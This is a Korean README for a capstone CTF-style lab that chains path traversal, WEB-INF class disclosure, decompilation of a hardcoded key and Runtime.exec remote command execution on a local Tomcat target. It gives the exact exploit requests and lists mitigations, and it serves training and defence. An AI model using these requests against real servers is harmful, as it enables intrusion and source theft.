# 캡스톤 — JSP 체인 (WEB-INF 디컴파일 → 서버 탈취)

| | |
|---|---|
| 버그클래스 | Path Traversal → Source(Class) Disclosure → 디컴파일 → RCE |
| 언어 | JSP / Java / Tomcat |
| 난이도 | ★★★★ |
| 포트 | 9711 |

## 시나리오 (금융권에 흔한 Java/JSP 환경)
블랙박스에서 시작해 **소스를 직접 확보·분석**하여 서버 탈취까지 가는 화이트박스-from-블랙박스 체인.

1. **경로조작 다운로드** — `/download?file=` 가 경로 검증을 하지 않음.
2. **WEB-INF 노출** — `WEB-INF/web.xml`(서블릿 매핑) → `WEB-INF/classes/com/corp/AdminServlet.class` 다운로드.
3. **디컴파일** — jd-gui/CFR/procyon 으로 `AdminServlet.class` 복원 → 하드코딩 키 + `Runtime.exec` 발견.
4. **서버 탈취(RCE)** — 비공개 엔드포인트 `/sys/exec-9f3a?key=...&cmd=cat /flag` 호출 → flag.

## 실행
```bash
./gen_flags.sh
docker compose up -d --build jsp-chain
# http://localhost:9711
```

## 진행
1. `/download?file=WEB-INF/web.xml` → 서블릿 매핑에서 `/sys/exec-9f3a` (com.corp.AdminServlet) 확인.
2. `/download?file=WEB-INF/classes/com/corp/AdminServlet.class` 로 클래스 확보.
3. 디컴파일 → `OPS_KEY = "..."` 와 `Runtime.exec(cmd)` 확인.
4. `/sys/exec-9f3a?key=<발견한키>&cmd=cat /flag` → flag.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 학습 포인트
경로조작으로 *소스 자체를 확보*하는 실무 감각 · 컴파일 산출물 디컴파일 · 복원 소스 오딧 → 취약점 도출 · 연계 익스플로잇.

## 대응방안
다운로드 경로 정규화·화이트리스트·WEB-INF 차단, 민감 로직/키를 소스에 하드코딩 금지(설정·시크릿매니저), 운영 엔드포인트 인증·망분리.
